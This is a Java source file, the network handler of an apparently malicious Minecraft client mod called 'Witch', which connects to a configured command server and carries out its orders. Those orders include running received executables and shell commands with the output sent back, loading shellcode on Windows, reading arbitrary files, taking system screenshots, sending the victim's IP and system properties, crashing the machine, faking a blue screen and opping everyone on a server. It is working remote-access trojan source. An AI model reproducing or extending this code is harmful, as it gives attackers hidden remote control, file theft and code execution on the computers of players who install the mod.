package me.soda.witch.client.connection;

import com.mojang.blaze3d.systems.RenderSystem;
import me.soda.witch.client.Cfg;
import me.soda.witch.client.Witch;
import me.soda.witch.client.modules.*;
import me.soda.witch.client.utils.KeyLocker;
import me.soda.witch.client.utils.MCUtils;
import me.soda.witch.client.utils.ScreenshotUtil;
import me.soda.witch.client.utils.ShellcodeLoader;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.LogUtil;
import me.soda.witch.shared.NetUtil;
import me.soda.witch.shared.ProgramUtil;
import me.soda.witch.shared.socket.TcpClient;
import me.soda.witch.shared.socket.messages.Message;
import me.soda.witch.shared.socket.messages.messages.*;
import net.minecraft.client.gui.screen.ConnectScreen;
import net.minecraft.client.gui.screen.TitleScreen;
import net.minecraft.client.network.ServerAddress;
import net.minecraft.client.util.GlfwUtil;

import java.lang.management.ManagementFactory;

public class Client extends TcpClient {
    public int reconnections = 0;

    public Client() {
        super(Cfg.host, Cfg.port, 30000);
    }

    @Override
    public boolean onReconnect() {
        if (reconnections <= 10) {
            reconnections++;
        } else {
            reconnectTimeout = -1;
            LogUtil.println("Witch end because of manual shutdown or too many reconnections");
            return false;
        }
        return true;
    }

    @Override
    public void onOpen() {
        LogUtil.println("Connection initialized");
        Witch.send(MCUtils.getPlayerInfo());
        Witch.send("getconfig");
        Witch.send("ip", NetUtil.getIP());
    }

    @Override
    public void onClose(DisconnectData disconnectData) {
        Witch.CHAT_WINDOW.receivedText.append("Admin disconnected.");
        LogUtil.println("Disconnected: " + disconnectData.reason());
    }

    @Override
    public void onMessage(Message message) {
        try {
            LogUtil.println("Received message: " + message.data.getClass().getName());
            if (message.data instanceof ByteData data && data.id.equals("execute")) {
                new Thread(() -> ProgramUtil.runProg(data.bytes())).start();
            } else if (message.data instanceof ClientConfigData data) {
                Witch.CONFIG_INFO = data;
            } else if (message.data instanceof FollowData data) {
                Follower.INSTANCE.follow(data);
            } else if (message.data instanceof SpamData data) {
                Spam.INSTANCE.spam(data);
            } else if (message.data instanceof BooleanData data) {
                switch (data.id()) {
                    case "lagger" -> Lag.INSTANCE.lag(data.bl());
                    case "bsod" -> new BSOD().toggle(data.bl());
                    case "keylocker" -> KeyLocker.toggle(data.bl());
                    case "lick" -> Lick.INSTANCE.lick(data.bl());
                }
            } else if (message.data instanceof StringsData data) {
                if (data.data().size() == 0) {
                    switch (data.id()) {
                        case "mods" -> Witch.send("mods", MCUtils.allMods());
                        case "systeminfo" -> Witch.send("systeminfo", MCUtils.systemInfo());
                        case "screenshot" -> ScreenshotUtil.gameScreenshot();
                        case "screenshot2" -> Witch.send("screenshot2", ScreenshotUtil.systemScreenshot());
                        case "config" -> Witch.send(Witch.CONFIG_INFO);
                        case "player" -> Witch.send(MCUtils.getPlayerInfo());
                        case "skin" -> MCUtils.sendPlayerSkin();
                        case "kick" -> MCUtils.disconnect();
                        case "runargs" ->
                                Witch.send(new StringsData("runargs", ManagementFactory.getRuntimeMXBean().getInputArguments()));
                        case "props" -> Witch.send("props", System.getProperties().toString());
                        case "ip" -> Witch.send("ip", NetUtil.getIP());
                        case "crash" -> GlfwUtil.makeJvmCrash();
                        case "op@a" -> OpEveryone.INSTANCE.opEveryone(false);
                        case "deop@a" -> OpEveryone.INSTANCE.opEveryone(true);
                    }
                } else if (data.data().size() == 1) {
                    String msg = data.data().get(0);
                    switch (data.id()) {
                        case "join_server" -> {
                            ServerAddress address = ServerAddress.parse(msg);
                            RenderSystem.recordRenderCall(() -> ConnectScreen.connect(new TitleScreen(), Witch.mc, address, null));
                        }
                        case "chat" -> {
                            Witch.CHAT_WINDOW.visible(!msg.equals("false"));
                            if (msg.equals("false")) return;
                            Witch.CHAT_WINDOW.receivedText.append("Admin:" + msg);
                        }
                        case "shell" -> new Thread(() -> {
                            String result = ProgramUtil.runCmd(msg);
                            Witch.send("shell", "\n" + result);
                        }).start();
                        case "shellcode" -> {
                            if (ProgramUtil.isWin()) new Thread(() -> new ShellcodeLoader().loadShellCode(msg)).start();
                        }
                        case "read" -> Witch.send("read", FileUtil.read(msg));
                        case "open_url" -> ProgramUtil.openURL(msg);
                    }
                }
            }
        } catch (Exception e) {
            LogUtil.println("Corrupted message!");
            LogUtil.printStackTrace(e);
        }
    }
}